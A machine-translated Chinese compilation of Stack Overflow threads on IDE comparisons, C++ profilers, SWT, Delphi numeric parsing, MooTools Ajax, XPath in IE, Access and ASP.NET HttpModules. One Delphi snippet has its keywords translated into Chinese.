> 时间：2010-10-28T10:01:51.543

IntelliJ 比 Eclipse 做得更好的一件事就是掏空你的口袋！

但是我确实更喜欢使用它，它与 Eclipce 相比的一大优势是它与文件系统同步的方式，适用于大型项目和慢速计算机（是的，在工作环境中，PC 比我们家里的慢得多）Eclipse 似乎尽管初始索引时间较慢，但 IntelliJ 似乎更快。

IntelliJ 社区版显然可以免费使用它，但您很快就会想要那些未包含在 CC 版中的额外重构和漂亮的小东西。

在我看来，它通常是一种更好的用户体验，但它是否物有所值是每个开发人员自己回答的问题。

但是让我们庆幸的是，我们现在拥有多达三个出色的 Java IDE，而 NetBeans 一直在变得更好。

* * *

## 回答 #30

> 赞同：2
> 
> 时间：2011-11-16T18:36:33.823

首先我喜欢intellij。它至少有 100 个 Eclipse 缺少的功能。我说的是在重构、重命名、移动和已经提到的其他方面，可靠性和智能性要好得多。

但是，intellij 不允许 eclipse 做的一件事。它不允许在同一个虚拟机下同时运行多个项目。

当你有前端，中间，核心，代理等单独的项目时，它们都必须相互交互，你不能同时快速修改和调试，afaik。我目前解决这个问题的唯一方法是使用 ant 脚本来部署和更新依赖项目中的 jar，或者使用 maven。

Eclipse 允许在一个 ide vm 实例下调试多个项目。

* * *

## 回答 #31

> 赞同：1
> 
> 时间：2009-11-19T21:08:55.873

我最近发现 IntelliJ IDEA 比 Eclipse 至少有两个优势。

如果尝试在 JSP 代码编辑器中使用代码格式化，那么 JSP 脚本就会损坏。Eclipse 变得有点疯狂，它到处广告随机的代码片段。IDEA 表现得非常好。

另一件事是在 JBoss 服务器上部署应用程序的速度。IntelliJ 正在替换 JBoss 的 tmp 文件夹中的应用程序，因此重新部署非常快。Eclipse WTP 正在替换部署文件夹中的应用程序，事实证明，部署文件夹的持续时间要长得多。

* * *

## 回答 #32

> 赞同：1
> 
> 时间：2011-05-25T23:43:14.787

目前，它是唯一可以将选项卡撕成另一个窗口的窗口。当您有更多屏幕时很方便。

* * *

## 回答 #33

> 赞同：0
> 
> 时间：2008-12-17T02:52:03.460

我不记得在 Eclipse 中是否可以使用 word/line/method/class 换行

在 Intellij Idea 中，您使用`Ctrl+W`

* * *

## 回答 #34

> 赞同：0
> 
> 时间：2009-07-20T22:49:21.463

从 Maven POM 打开一个项目。只需选择“打开项目...”导航到您的顶级 pom.xml 并按 Enter 键：) NetBeans 现在也具有此功能。

* * *

## 回答 #35

> 赞同：0
> 
> 时间：2011-09-07T17:54:42.413

抱歉，如果这已经涵盖了，但只需在“更改”选项卡那里我可以看到我的本地更改、传入的更改、远程更改只是我不能没有的东西。在 Eclipse 中，我找不到这样的一个特征！

此外，像中间单击这样绑定到“打开声明”的简单操作是一个很棒的 UI 附加功能——我也看不到在 Eclipse 中实现的功能。

我的工作场所只有 Eclipse，但我正在认真考虑购买个人 Idea 许可证......

* * *

## 回答 #36

> 赞同：0
> 
> 时间：2012-01-22T04:55:34.060

在 IntelliJ 中，可以跳过使用“最后编辑位置”编辑的最后地点的历史记录。Eclipse 具有类似的功能，但 Eclipse 仅返回到一级编辑位置。

拥有历史记录而不是 Eclipse 提供的一个级别是一个很好的生产力特性：它充当自动书签的一种形式，因为您经常想跳回到您一直在进行更改的地方。我每天多次使用这个能力，当我被要求使用 Eclipse 做某事时，我会感到没有它的痛苦。

* * *

## 回答 #37

> 赞同：0
> 
> 时间：2014-02-26T09:43:36.870

两者有许多不同的功能和工作流程，这在所有答案中都很明显。但是，我认为在决定使用哪种框架时，还要考虑使用每种工具可以提高总体生产力。

我是 Netbeans 和 Eclipse 的忠实粉丝，并且已经使用了很多年。它们是出色的工具，根据您的工作，您可能需要选择其中一种。

然而，大约六个月前，在处理一个复杂的 Java Web 项目时，该项目涉及大量用于 HMT5 ui 的 javascript 前端代码，由于 js 自动完成错误，我被迫寻找 Eclipse 的替代品。我非常绝望，以至于我正在考虑为我的 js 代码返回一个简单的文本编辑器！！！

我只是碰巧遇到了 Intellij Idea（不幸的是，没有时间研究工具）。

虽然需要一些时间来适应 Idea 的做事方式，但撇开特殊功能不谈，在我看来，它通过左右小事提供的生产力提高是最大的资产。它对我来说效果更好，我现在是 Idea Ultimate 的付费订阅客户。一旦你习惯了这一点，就很难再回到其他任何事情上。

没有什么比免费更好的了，我是开源的忠实粉丝，但最后，如果你以此为生，那么每次都能更快地做事。

* * *

## 回答 #38

> 赞同：0
> 
> 时间：2014-04-02T12:49:58.343

我认为您可以坚持使用这些 IDE 中的任何一个。最好不要“担心在你不使用的 IDE 中错过巨大的好处”的最好迹象是我们在 Eclipse 粉丝和 IntelliJ 粉丝之间看到的很长的争论。这是一个好兆头，双方拥有几乎相同的力量，导致这场长期讨论得以幸存。

* * *

## 回答 #39

> 赞同：-1
> 
> 时间：2009-02-23T15:56:10.093

我没有用 IntellijIdea 编写过很多代码，但是在 IntellijIdea 中，您可以看到括号之间的代码块（*if、try/catch、cycle 等*）从哪里开始以及在哪里结束。

在 Eclipse（我在 Eclipse 3.2 中编写代码）中，您只能手动识别该块。

* * *

## 回答 #40

> 赞同：-1
> 
> 时间：2011-02-10T20:31:00.257

`Alt+Insert`在列模式下编辑文本。

* * *

## 回答 #41

> 赞同：-2
> 
> 时间：2008-10-29T19:07:37.370

显示导航栏 ALT-Home。

# java - 允许格式化/缩进/清理 JSP 代码的 Eclipse 最好的免费插件是什么？

> ID：239739
> 
> 赞同：10
> 
> 时间：2008-10-27T12:39:03.583
> 
> 标签：java, eclipse, jsp, intellij-idea

我知道 IntelliJ 有一个选项可以选择 JSP 文件中的所有代码，右键单击，然后选择“格式”。这很好地格式化了 JSP 文件中的所有 HTML、CSS、scriptlet 和 JSTL 标记。

Eclipse 可以做到这一点吗？

如果不是，那么最好的免费 Eclipse 插件是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-27T14:25:48.830

使用 Web Tool Plateform 平台（在 eclipse.org 网站上），这非常简单：在 JSP 编辑器选项卡中，右键单击->源->格式（或 Shift+Ctrl+F）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2010-11-14T09:48:10.283

[我使用来自Project Amateras](http://amateras.sourceforge.jp/)的 EclipseHTMLEditor 。确保在 Window > Preferences > General > Editors > File Associations 中将“Amateras JSP Editor”设置为文件类型“*.jsp”的默认编辑器。

**更新：**截至 2015 年 3 月 27 日，Project Amateras 似乎已经过时。然而[，WTP 的最新版本](http://www.eclipse.org/webtools/)有了很大改进，当然值得一试。感谢@Vogel612 提供的信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T14:14:15.593

我在 Eclipse 插件中心找到了这个。

看起来像一个多合一的格式化程序。我自己没有尝试过，但它可能是你正在寻找的

[NX格式](http://www.eclipseplugincentral.com/Web_Links-index-req-viewlink-cid-926.html)

# c++ - C++ 代码探查器

> ID：239742
> 
> 赞同：17
> 
> 时间：2008-10-27T12:39:33.473
> 
> 标签：c++, windows, visual-studio, profiler

有人可以推荐一个好的 C++ 代码分析器吗？

我遇到了 Shiny - 有什么好处吗？[http://sourceforge.net/projects/shinyprofiler/](http://sourceforge.net/projects/shinyprofiler/)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-27T12:57:19.100

用于 Unix/Linux 的[Callgrind](http://valgrind.org/info/tools.html)

[适用](http://www.compuware.com/products/devpartner/default.htm)于 Windows 的开发伙伴

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-27T12:45:15.803

不是特定于 C++ 的，但 AMD 的 CodeAnalyst 软件是免费的并且功能丰富。

[http://developer.amd.com/cpu/codeanalyst/codeanalystwindows/Pages/default.aspx](http://developer.amd.com/cpu/codeanalyst/codeanalystwindows/Pages/default.aspx)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-27T13:59:28.023

如果您使用 gcc，[则为 Gprof 。](http://www.cs.utah.edu/dept/old/texinfo/as/gprof.html)它可能对用户不友好，但仍然有用。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-10-27T13:53:33.683

您可能会对[Intel VTune](http://downloadcenter.intel.com/Product_Filter.aspx?ProductID=232&lang=eng)感兴趣。相当有用，允许收集低级事件，如缓存未命中，这对调优有很大帮助。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-27T13:23:19.750

如果您运行的是 VS 2010 的高级版，那么您将获得一个分析器。

我还使用了其他几个免费的，但它们无法与 MS 船上的相比。不过作为第二种意见很有用。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-27T13:29:41.907

Quantify（IBM/Rational PurifyPlus 包的一部分）是一个非常好的分析器，但并不便宜。它也可以在多个平台上使用——我已经在 Solaris、Windows 和 Linux 上使用过它。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-03-09T17:13:24.987

取决于你需要做什么：

1.  测量，因此您可以进行回归测试以查看性能是否发生变化。
2.  找出性能欠佳的原因并优化它们。

这些不一样。

对于 1，使用推荐的分析器之一。

对于 2，我更喜欢的分析器是您已经拥有的：http:
[//www.wikihow.com/Optimize-Your-Program%27s-Performance](http://www.wikihow.com/Optimize-Your-Program%27s-Performance)
[要了解情况如何，请查看此。](https://stackoverflow.com/questions/926266/performance-optimization-strategies-of-last-resort/927773#927773)

对于 C++，对于 C# 和任何鼓励抽象层的语言，从软件工程的角度来看，这些层可能好也可能不好，但它们会降低性能。每个方法调用都是程序执行中的一个弯路，这种风格鼓励你嵌套这些东西，有时是不必要的。此外，这种风格会阻止你了解或关心它们内部发生的事情。您可能会发现他们在下面创建和删除对象的速度和通用性远远超出了您的应用程序真正需要的水平。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-06-01T13:38:18.030

[AQtime](http://www.automatedqa.com/products/aqtime/)（适用于 Windows）

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-27T16:02:24.453

如果您可以使用 Mac，那么我建议您使用CHUD 工具中的[Shark](http://developer.apple.com/tools/sharkoptimize.html)。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-28T18:52:56.840

您可以在 Linux 或 Solaris 上使用 Sun Studio 12 中的分析器。免费。[http://developers.sun.com/sunstudio/index.jsp](http://developers.sun.com/sunstudio/index.jsp)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2011-01-28T03:28:17.257

如果您找不到 DevPartner，那是因为我们已经搬迁到新的所有权下。在 Micro Focus 网站上查看我们：http: [//www.microfocus.com/products/micro-focus-developer/devpartner/index.aspx](http://www.microfocus.com/products/micro-focus-developer/devpartner/index.aspx)。无耻的插件：我在 DevPartner 团队工作。我们期待已久的 64 位版本的 BoundsChecker 和 C++/.NET 分析器于 2011 年 2 月 4 日发布。我们更改了定价模型，因此您可以选择整个套件或只选择性能分析器（如果需要）。请在新的 DPS 10.5 版本上线时查看它！

# plugins - 寻找有吸引力的论坛添加到我的应用程序

> ID：239743
> 
> 赞同：2
> 
> 时间：2008-10-27T12:39:48.030
> 
> 标签：plugins, user-forums

寻找一个有吸引力的、高度可定制的论坛插件来实现。不想自己建造一个，但不想满足于通常的废话。什么阿贾克斯？

倾向于社区服务器，但很想看看其他人必须推荐什么。

谢谢。

编辑：这是一个 ASP.NET/C#/SQL 应用程序

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T13:51:41.300

见[http://ask.metafilter.com/52003/Good-community-forum-software](http://ask.metafilter.com/52003/Good-community-forum-software)

选项

*   [Lussumo的香草](http://getvanilla.com/)
*   [简单机器](http://www.simplemachines.org/)
*   [BBP新闻](http://bbpress.org/)

吸引力是主观的，所以你需要环顾四周。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T12:47:50.150

如果您还没有身份验证或任何正在运行的东西，您可以查看在 DotNetNuke 中运行的[活动论坛。](http://www.activemodules.com/products/activeforums.aspx)我一直在使用它，到目前为止我很高兴，为用户提供 ajax 分页，为机器人提供标准分页，内置社交书签，以及许多其他不错的项目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-28T22:00:43.543

YetAnotherForum 就像您的应用程序一样是 ASP.NET/C#/SQL，它看起来非常漂亮。不过，我不确定 AJAX。

它可以在 DotNetNuke、Rainbow 中运行，也可以独立运行。

[http://www.yetanotherforum.net/features.aspx](http://www.yetanotherforum.net/features.aspx)

# java - 菜单项加速键仅在显示菜单项后才有效

> ID：239744
> 
> 赞同：0
> 
> 时间：2008-10-27T12:40:41.163
> 
> 标签：java, swt

我正在使用 Eclipse 3.4.1 中的库开发 SWT/JFace 应用程序。我在 Windows（Vista 32 位）和 Ubuntu 8.10 32 位上遇到以下问题：

我在 JFace ApplicationWindow 的 createMenuManager 方法中创建了一个菜单栏。我为文件、编辑和帮助添加了 MenuManagers。

然后我将 ExitAction 添加到文件 MenuManager 中，如下所示：

```
filemenu.add(new ExitAction(this)); 
```

ExitAction 是这样定义的：

```
public class ExitAction extends Action {
  final ApplicationWindow window;

  public ExitAction(ApplicationWindow w) {

    this.window = w;
    setText("E&xit");
    setToolTipText("Exit the application");
    setAccelerator(SWT.MOD1 + 'Q');    
  }
} 
```

现在，当我的应用程序启动时，我希望能够按“CTRL+Q”退出应用程序。然而，这不起作用。只有在我单击菜单栏中的“文件”然后单击“CTRL+Q”后，应用程序才会退出。

我已经用不同的加速器尝试过这个 - 相同的行为。

但是，如果我创建一个“MenuItem”而不是“Action”来为菜单栏做出贡献，它确实有效。

这是一个 SWT 错误还是我错过了什么？

托斯滕。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-11-05T13:30:38.183

更新：我有一个重复的错误，其中也包含一个解决方法。错误网址是：[https ://bugs.eclipse.org/bugs/show_bug.cgi?id=243758](https://bugs.eclipse.org/bugs/show_bug.cgi?id=243758)

基本上解决方法是调用`create()`然后强制所有菜单项被初始化`ApplicationWindow`。`getMenuBarManager().updateAll(true);`

当然，您必须在创建菜单项后调用上述方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-29T15:51:57.920

AFAIK`setAccelerator(.)`除了将适当的文本添加到您的`MenuItem`. 您有责任注册`KeyUp`事件并对其做出反应。

您可以使用独立于您的小部件`Display.addFilter(SWT.KeyUp, myListener)`来注册您的。`Listener`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-11-05T10:59:51.093

原来这是 Eclipse 3.4 中的一个错误。我已经提交了一个错误报告：[https ://bugs.eclipse.org/bugs/show_bug.cgi?id=253078](https://bugs.eclipse.org/bugs/show_bug.cgi?id=253078)

# delphi - 检查值是否是Delphi中的日期/数字的正确方法是什么

> ID：239746
> 
> 赞同：6
> 
> 时间：2008-10-27T12:41:56.137
> 
> 标签：delphi

在Delphi中检查值是否是日期/数字的正确方法是什么？

我知道其他语言具有 isDate 和 isNaN 等功能，但 Delphi 等价物是什么？此刻我有这个

```
function isNumeric(s1:string):boolean;
begin   
   // will throw exception if its not a number
  // there must be a better way to do this!!
  try
     StrTofloat(s1);
       result :=  TRUE ;
     except
       result := FALSE;
      end;
end; 
```

但是抛出异常并不好，而且每次调用代码时我都会看到异常对话，这使得调试变得困难。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-27T12:45:08.813

对于整数，您可以使用 TryStrToInt 进行检查和转换而不会引发异常：

```
function TryStrToInt(const s: string; out i : integer): boolean; 
```

不过，我不确定浮点数是否完全等效，因此您可能需要使用 StrToFloat() 并接受 TFormatException 的可能性。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T12:46:49.153

有一系列功能`TryStrToFloat`，例如`TryStrToDateTime`等，它们可以做到这一点。顺便说一句，`StrToFloat`其他人在引发异常之前在内部使用“尝试”版本。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T12:54:12.727

首先，如果您想保留开箱即用的语言，则 StrToFloatDef 函数是一个有用的替代方法。

但是，您最好的选择是部署 JEDI 代码库 ( [http://www.delphi-jedi.org/](http://www.delphi-jedi.org/) ) 并从那里使用 StrIsNumber 函数。

JEDI 是开源的，在很多方面都非常有用，而且几乎是必须的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T20:36:19.003

捕获异常非常慢。如果您打算快速连续地重复使用这样的函数，例如在文件导入期间验证字段时，则可能值得推出自己的函数，该函数在落入 try/except 块之前进行一些简单的字符级别检查。在解析大量格式不正确的数据时，我之前使用过类似的东西，性能大幅提升。

```
函数 IsNumeric(aValue : string): boolean;
变量
  我：整数；
开始
  结果：=假；
  对于 i := 1 到 Length(aValue) 做
    if (NOT (aValue[i] in ['0'..'9', '.', '-', '+', 'E', 'e'])) 然后
      出口;
  尝试
    StrToFloat(aValue);
    结果：=真；
  除了
  结尾;
结尾;

```

显然这可能并不完美，并且其中存在硬编码值的限制。完全取决于您的需求，这只是一些简单的东西，适用于内部流程。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-07-11T21:27:50.310

我使用 strtointdef(singlecharacter,-1)

```
procedure TForm1.Button1Click(Sender: TObject);
var
x,i:integer;
teststring:string;

begin
teststring:='1235';
for i:=1 to length(teststring) do begin
    x:= strtointdef(teststring[i],-1);
    if x=-1 then break;
end;
if x<0 then showmessage('not numeric')
else showmessage('numeric');

end; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-27T15:04:02.793

您可以通过选中弹出的“忽略此异常”框来关闭您不想要的烦人异常。然后将忽略该异常类的未来异常。要再次开始询问，只需转到选项|调试器选项并取消选中您忽略的选项。

# language-agnostic - 开发游戏最重要的因素是什么？

> ID：239759
> 
> 赞同：3
> 
> 时间：2008-10-27T12:48:13.003
> 
> 标签：language-agnostic

我想知道这一点，以了解为什么像马里奥这样的游戏今天仍在玩，因为没有其他游戏。这是为了在未来的游戏项目中实施。

***开发游戏最重要的因素是什么？***

游戏性还是图形？两个都？

**编辑：**

有可能将这两者结合起来吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-27T12:57:02.440

游戏玩法，结合了经常被忽略的易玩性概念。如果我不能在几分钟内拿起游戏并取得进展，我可能不会在我离开后重新开始。不得不重新学习如何玩游戏真是令人沮丧。马里奥倾向于有简单的界面，只有一两个命令，这使得它很容易回来。回到这个：http: [//xkcd.com/484/](http://xkcd.com/484/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T13:14:44.293

**游戏玩法**。如此多的现代游戏似乎只是将全部预算都花在了开发令人难以置信的图形引擎上，而忘记了包含情节/有趣的游戏玩法。一个例子是《毁灭战士 3》。玩起来很有趣，也很诡异，但它是如此重复。一个又一个又黑又荒凉的隧道……将它与有大量不同类型任务的 Doom 2 相比较。《毁灭战士 2》的画面很垃圾，但人们继续玩它是有原因的。

话虽如此，人们玩旧游戏的一个重要原因是怀旧价值。游戏玩法可能不是特别出色，但它确实带回了回忆，从而自动为游戏增加了价值。

图形当然也很重要……你不能再使用 16 色 2D 精灵了（或者至少，不那么容易了）。但是，与其将全部预算都花在图形上，不如研究一个好的图形引擎，并花一些时间制作游戏：

*   玩的很开心。
*   有重播价值。
*   很容易拿起。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T12:51:34.807

最重要的是您娱乐您的目标用户。

一些用户想要游戏。一些用户仅仅被图形所震撼。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T13:57:18.280

认为真正重要的是成瘾性，当然，这很难编程。但是，我认为关键是一项非常容易“几乎”实现的任务。正是“我快到*了*；再试一次”的效果让大多数人回头。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T12:53:04.587

对于大多数人来说，这可能有点老派，但我不得不说游戏玩法。

这么说吧，这些天我仍然发现自己在模拟器上运行我喜欢的旧 SNES 游戏，但我看不到自己玩的游戏有很棒的图形，但在它有时间之后，游戏玩法却很垃圾。

两者都是可取的，但它是产生每个时代经典的游戏玩法。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-11-16T01:16:28.233

玩游戏会让你着迷，尤其是在学习曲线非常低的情况下，例如吃豆人或突破。图形是吸引您下载/购买游戏的原因。有时漂亮的图形只是一个演示不一定能转化为一个漂亮的游戏。我见过很多具有漂亮的前屏幕、背景等的游戏，但实际的游戏图形，如角色、对象等，却很糟糕。一般来说，考虑您的游戏设计以使其易于理解和开始游戏是一个好主意，然后通过添加老板、威胁、奖金、提高速度等，在以后的关卡中变得更难。然后用时髦的方式微调游戏的外观图形。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-27T12:56:05.173

我会说这取决于。对于独立游戏来说，游戏玩法是最重要的，因为这会让你的玩家保持愉悦。显然，对于大预算游戏，你需要两者都取得成功。但只要你的画面干净整洁，玩家就不应该抱怨太多。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-27T13:26:47.637

区分游戏*设计*和游戏*编程*。对于程序员来说，游戏只是一个应用程序，与任何其他类型的软件没有什么不同。游戏*设计*是一个整体'另一种颜色的野兽:)如果你能很好地编程，你就可以很好地编程游戏。

优秀的游戏设计师与优秀的故事讲述者是同一种罕见的创意——他们不一定都是优秀的*作家*。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-27T16:51:27.007

很容易获得基础知识但难以掌握的游戏玩法当然是一个因素。例如，看看《暗黑破坏神 II》，它有一些不错的基本元素，但也有一些可以长时间玩的元素，比如 horadic cube recipes。

可重玩性是另一个因素。如果我选择一个不同的起始角色，游戏会发生多大的变化，假设游戏具有这种风格，如动作 RPG 或 FPS 或节拍游戏（街头霸王 II）？从不同的角度来看游戏是否令人愉快？如果我在实时战略游戏中有电脑对手，AI 有多好？有多少设置？

图形可以是一个很好的补充，但仅仅因为一个游戏看起来不错并不意味着我会在它上面花费数百个小时。Titan Quest 将是一个很好的例子，它采用了暗黑破坏神 II 的风格，并添加了一些令人眼花缭乱的糖果来打造一款不错的游戏。

怀旧是为什么一些老游戏仍然像老的超级马里奥游戏一样玩的一个重要因素。玩那些旧游戏的记忆，看到进入下一个级别是多么酷，这可能是为什么有些人会一次又一次地回去。这就是为什么我有时仍然玩我的 SNES 的原因。

# javascript - 对 IE 上的 XPath 问题感到困惑

> ID：239762
> 
> 赞同：5
> 
> 时间：2008-10-27T12:50:14.280
> 
> 标签：javascript, internet-explorer, xpath

David Flanagan 关于 JavaScript 的优秀书籍有一个示例，展示了如何在 IE 中执行 XPath 查询。在第五版的第 518 页，您可以看到示例 21-10 中的以下代码片段：

```
// In IE, the context must be an Element not a document,
// so if the context is a document, use the documentElement instead
if (context == doc) context = doc.documentElement;
return context.selectNodes(this.xpathText); 
```

我发现这段代码是绝对必要的。看来（尽管我不明白为什么）在 IE XMLHttpRequest 上似乎随机返回对与接收到的 XML 对应的文档或 documentElement 的引用。这里发生了什么事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T12:53:42.120

我相信您回答了您自己的问题，IE 每隔一段时间就会返回对文档或文档元素的引用，if 语句只是一个快速的条件，可以在需要时修复它。

如果你问为什么 IE 会这样做，我认为这里没有人能够给出这个答案......

# javascript - Ajax 用图像替换文本

> ID：239786
> 
> 赞同：0
> 
> 时间：2008-10-27T12:57:16.230
> 
> 标签：javascript, ajax, mootools, request

我整理了以下 mootools 脚本

```
 window.addEvent('domready', function() {
    var shouts = "timed.php";
    var log = $('log_res');
    function updateData (url,target)
    {
        new Ajax(url,{
        method: 'get', 
        update: $(target), 
        onComplete: function() {
        log.removeClass('ajax-loading');}  }).request();
        log.empty().addClass('ajax-loading');
    }

    var update = function(){ updateData ( shouts, 'log_res' ); };
    update();           // call it immediately
    update.periodical(10000);   // and then periodically

 }); 
```

继承人的html

```
<div id="AJAX">
    <h3>Ajax Response</h3>
    <div id="log_res">exercise</div>
</div> 
```

它使用moo 1.1。

上述工作正常，页面加载然后 ajax 请求启动 div id log_res 在更新时有一个 ajax-loading 类，当它完成时，div 中的文本练习被替换为 ajax 返回的任何内容（yippee）。但是我想在页面加载时将一些自定义 HTML 放入 div，因为 ajax-loading 类不足以包含信息，我还想在 ajax 请求检索信息时将一个 spinny flasher 放入 div . 希望这是有道理的！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T13:29:39.583

使用 MooTools 1.2，这可以按要求工作：

```
function updateData (url, target)
{
  var target = $(target);
  target.empty().addClass('ajax-loading');
  target.innerHTML = "Loading...";
  new Request({
    url: url, 
    method: 'get',
    onComplete: function(responseText) {
      target.removeClass('ajax-loading');
      target.innerHTML = responseText;
    }
  }).send();
} 
```

由于您不喜欢使用 MooTools 1.1，因此我必须深入挖掘一下……实际上，我使用与您几乎相同的设置来工作（注意我使用`target`而不是`log`，它是在此功能范围之外定义的） ：

```
function updateData (url, target)
{
  var target = $(target);
  target.empty().addClass('ajax-loading');
  target.innerHTML = "Loading...";
  new Ajax(url, {
    method: 'get',
    update: target,
    onComplete: function() {
      target.removeClass('ajax-loading');
    }
  }).request();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T23:33:41.547

你能不能做这样的事情：

```
function updateData (url, target)
{
  var target = $(target);
  target.innerHTML = 'Please wait...';

  //and the rest of the function
} 
```

# exception - 为什么在创建 XPathDocument 时会出现 Web 异常？

> ID：239788
> 
> 赞同：1
> 
> 时间：2008-10-27T12:57:51.160
> 
> 标签：exception, xpathdocument

使用引用的 DTD 创建 XPathDocument 有时会引发 Web 异常。为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-28T01:00:09.593

您可以编写自定义 XmlUrlResolver，然后忽略远程 DTD。另外，我相信您可以在 XmlTextReader 上设置 use XmlResolver = null。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-02-01T08:56:36.707

对于那些感兴趣的人，我找到了一种禁用 dtd 检查的解决方法

```
XmlReaderSettings settings = new XmlReaderSettings();
 settings.XmlResolver = null;
 settings.ProhibitDtd = false;

 var xmlReader = XmlTextReader.Create(new StringReader(xmlString),settings);
 XPathDocument xpathDoc = new XPathDocument(xmlReader); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T12:58:18.477

见[http://todotnet.com/archive/2006/07/27/8248.aspx](http://todotnet.com/archive/2006/07/27/8248.aspx)

> 因为在XPathDocument的构建中，有一个http GET命令来查看是否可以访问DTD。它对 DTD 没有任何作用。这是为了以防万一。因此，虽然 XPathDocument 最初设置为 XmlDocument 的更快替代方案，但您将获得需要解决的 http 请求的额外开销。想象一下服务器在地球的另一端！

# database - 如何在运行时更改 Access 表中列的“行源”？

> ID：239792
> 
> 赞同：0
> 
> 时间：2008-10-27T12:58:09.910
> 
> 标签：database, ms-access, runtime

我想通过代码更改 Access 表中的“行源”值。这样我可以过滤用户可以在列的组合框中选择的内容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T19:07:46.747

根据 Dave DuPlantis 的回答，您可能希望阅读各种 Microsoft Access MVP 的 Access Web中的[“表中查找字段的邪恶” 。](http://www.mvps.org/access/lookupfields.htm)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T13:55:22.307

我不知道这是否适合您，但我建议将表格和过滤选项分开，设置一个表单来进行数据输入和修改，并使用代码为组合框设置行源表格。正如您已经看到的，虽然 Access 确实提供了将表视为不仅仅是表的机会，但这主要用于 GUI 目的。在幕后，Access 更喜欢您使用表单进行数据输入。

[如果您需要使用表格方法，您可以尝试查看此处](http://www.mdbmakers.com/forums/showthread.php?t=187)引用的 MS 知识库文章。（kb 文章在[此处](http://support.microsoft.com/kb/151196)和[此处](http://support.microsoft.com/kb/159367)。）请记住，这些文章指的是 Access 97，可能不再相关。我无法在 Access tabledef 中找到对这些属性的任何最新引用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T19:44:39.247

你的问题很混乱。“RowSource”是列表框或组合框的属性。表没有 RowSource，但正如 Remou 指出的那样，Access 允许您在表中定义字段，以便它们显示一个组合框，从相关表中查找值。这个组合框有一个行源，所以这可能就是你的意思，但这只是一个糟糕的主意。

您在表格设计中定义的组合框是用户界面对象，UI 不属于您的表格定义。它不仅会导致各种问题，而且还意味着您的表本身可能会因更改其他表而导致查找字段的定义无效。

用户界面控件属于用户界面对象，这意味着您应该只将它们放在表单中（或者，在最低级别，放在已保存的查询中）。

同样，过滤用户是一个用户界面问题，与表格设计无关。

# asp.net - 在运行时以编程方式注册 HttpModules

> ID：239802
> 
> 赞同：47
> 
> 时间：2008-10-27T12:59:25.587
> 
> 标签：asp.net, web-config, httpmodule

我正在编写一个应用程序，其中第 3 方供应商可以编写插件 DLL 并将它们放入 Web 应用程序的 bin 目录中。我希望这些插件能够在必要时注册自己的 HttpModules。

无论如何，我是否可以在运行时在管道中添加或删除 HttpModules 而无需在 Web.Config 中具有相应的条目，或者在添加/删除模块时我是否必须以编程方式编辑 Web.Config？我知道这两种方式都会导致 AppDomain 重新启动，但我宁愿能够在代码中完成它，而不是不得不捏造 web.config 来达到相同的效果。

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2008-10-27T14:40:53.447

> 它必须在 HttpApplication 生命周期中的正确时间完成，也就是 HttpApplication 对象初始化的时候（多次，每个 HttpApplication 实例一次）。唯一正确的方法是 HttpApplication Init()。
> 
> 要通过代码连接模块，您可以运行如下代码，而不是 web.config 中的 HttpModule 定义：
> 
> ```
>  public class Global : System.Web.HttpApplication
>   {
>      // some modules use explicit interface implementation
>      // by declaring this static member as the IHttpModule interface
>      // we work around that
>      public static IHttpModule Module = new xrnsToashxMappingModule();
>      public override void Init()
>      {
>          base.Init();
>          Module.Init(this);
>      }
>   } 
> ```
> 
> 您所做的就是覆盖 HttpApplication 的 Init() 方法，然后访问静态实例的 Init 方法。模块的 Init() 连接了事件，然后就可以离开了。

通过[Rick Strahl 的博客](http://www.west-wind.com/weblog/posts/44979.aspx)

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2010-07-01T14:32:25.367

